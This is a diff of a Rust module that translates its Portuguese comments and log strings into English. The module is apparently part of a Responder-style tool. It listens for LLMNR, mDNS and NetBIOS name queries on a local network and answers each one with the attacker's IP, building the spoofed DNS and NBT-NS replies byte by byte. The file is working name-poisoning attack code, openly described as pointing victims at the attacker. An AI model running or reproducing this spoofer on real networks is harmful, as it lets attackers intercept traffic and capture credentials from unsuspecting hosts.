@@ -1,4 +1,4 @@
-//! Listeners UDP que respondem queries de nome apontando para o atacante.
+//! UDP listeners that answer name queries pointing at the attacker.
 use crate::dns;
 use anyhow::Result;
 use socket2::{Domain, Protocol, Socket, Type};
@@ -28,29 +28,29 @@ fn bcast_socket(port: u16) -> Result<UdpSocket> {
     Ok(UdpSocket::from_std(std_sock)?)
 }
 
-/// LLMNR (5355 / 224.0.0.252) e mDNS (5353 / 224.0.0.251) usam wire DNS.
+/// LLMNR (5355 / 224.0.0.252) and mDNS (5353 / 224.0.0.251) use DNS wire format.
 pub async fn run_dns_poison(proto: &str, port: u16, group: Ipv4Addr, our_ip: Ipv4Addr) -> Result<()> {
     let sock = mcast_socket(port, group)?;
-    eprintln!("[*] {proto}: escutando {port} (grupo {group})");
+    eprintln!("[*] {proto}: listening on {port} (group {group})");
     let mut buf = [0u8; 2048];
     loop {
         let (n, from) = sock.recv_from(&mut buf).await?;
         let q = &buf[..n];
-        // só responde queries (QR=0)
+        // only answer queries (QR=0)
         if n < 12 || buf[2] & 0x80 != 0 {
             continue;
         }
         if let Some(name) = dns::question_name(q) {
             if let Some(resp) = dns::build_a_response(q, our_ip) {
                 let _ = sock.send_to(&resp, from).await;
-                eprintln!("[+] {proto}: {from} buscou '{name}' -> respondi {our_ip}");
+                eprintln!("[+] {proto}: {from} asked for '{name}' -> answered {our_ip}");
             }
         }
     }
 }
 
 fn nbt_decode(name: &[u8]) -> String {
-    // 32 bytes codificados: cada byte vira 2 nibbles + 'A'
+    // 32 encoded bytes: each byte becomes two nibbles + 'A'
     if name.len() < 32 {
         return String::new();
     }
@@ -66,18 +66,18 @@ fn nbt_decode(name: &[u8]) -> String {
     out.trim().to_string()
 }
 
-/// NBT-NS (137, broadcast): name service NetBIOS.
+/// NBT-NS (137, broadcast): NetBIOS name service.
 pub async fn run_nbtns(our_ip: Ipv4Addr) -> Result<()> {
     let sock = bcast_socket(137)?;
-    eprintln!("[*] NBT-NS: escutando 137 (broadcast)");
+    eprintln!("[*] NBT-NS: listening on 137 (broadcast)");
     let mut buf = [0u8; 2048];
     loop {
         let (n, from) = sock.recv_from(&mut buf).await?;
-        // question name começa em 12: [0x20][32 bytes][0x00]
+        // question name starts at 12: [0x20][32 bytes][0x00]
         if n < 50 || buf[12] != 0x20 {
             continue;
         }
-        // só name queries (opcode bits)
+        // name queries only (opcode bits)
         if buf[2] & 0x80 != 0 {
             continue;
         }
@@ -91,7 +91,7 @@ pub async fn run_nbtns(our_ip: Ipv4Addr) -> Result<()> {
         resp.extend_from_slice(&[0x00, 0x01]); // an
         resp.extend_from_slice(&[0x00, 0x00]); // ns
         resp.extend_from_slice(&[0x00, 0x00]); // ar
-        resp.extend_from_slice(name_field); // nome ecoado
+        resp.extend_from_slice(name_field); // echoed name
         resp.extend_from_slice(&[0x00, 0x20]); // type NB
         resp.extend_from_slice(&[0x00, 0x01]); // class IN
         resp.extend_from_slice(&[0x00, 0x04, 0x93, 0xe0]); // ttl
@@ -102,7 +102,7 @@ pub async fn run_nbtns(our_ip: Ipv4Addr) -> Result<()> {
         if let SocketAddr::V4(v4) = from {
             let dst = SocketAddrV4::new(*v4.ip(), 137);
             let _ = sock.send_to(&resp, dst).await;
-            eprintln!("[+] NBT-NS: {from} buscou '{decoded}' -> respondi {our_ip}");
+            eprintln!("[+] NBT-NS: {from} asked for '{decoded}' -> answered {our_ip}");
         }
     }
 }
